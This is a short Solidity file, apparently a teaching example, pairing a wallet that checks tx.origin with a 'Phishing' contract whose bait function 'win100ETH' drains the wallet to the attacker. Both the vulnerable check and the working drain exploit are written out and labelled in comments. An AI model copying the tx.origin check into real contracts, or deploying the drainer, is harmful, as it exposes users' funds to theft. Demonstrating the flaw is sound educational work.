// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Wallet {
    error TxOrigin__NotOwner();
    error TxOrigin__TransferFailed();

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function transfer(address payable _to, uint256 _amount) external {
        require(tx.origin == owner, TxOrigin__NotOwner()); // here lies the vulnerability to a phishing attack
        (bool sent, ) = _to.call{ value: _amount }("");
        require(sent, TxOrigin__TransferFailed());
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Phishing {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(address(msg.sender)); // owner is the attacker that will receive the drained funds
    }

    function drain() internal {
        wallet.transfer(owner, address(wallet).balance);
    }

    // phishing function that will drain funds
    function win100ETH() public {
        drain();
    }
}
